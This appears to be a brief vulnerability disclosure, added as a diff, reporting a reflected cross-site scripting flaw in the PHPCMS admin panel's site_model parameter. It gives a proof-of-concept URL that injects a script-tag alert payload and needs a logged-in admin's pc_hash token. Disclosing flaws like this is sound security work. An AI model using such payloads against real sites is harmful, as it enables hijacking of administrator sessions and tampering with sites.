@@ -1,0 +1,6 @@
+download:https://gitee.com/phpcms/phpcms </br>
+
+After logging in to the administrator background, visit this url. POC:http://localhost/index.php?m=admin&c=index&a=login&pc_hash=yPwiYd&a=public_set_model&c=index&m=admin&site_model=%3Cscript%3Ealert(1)%3C/script%3E&time=0.10436825733631849
+
+The parameter site_model has a cross-site scripting vulnerability 
+Pay special attention to the value of pc_hash, which can be obtained by logging in to the background ,I demonstrated here pc_hash=yPwiYd 
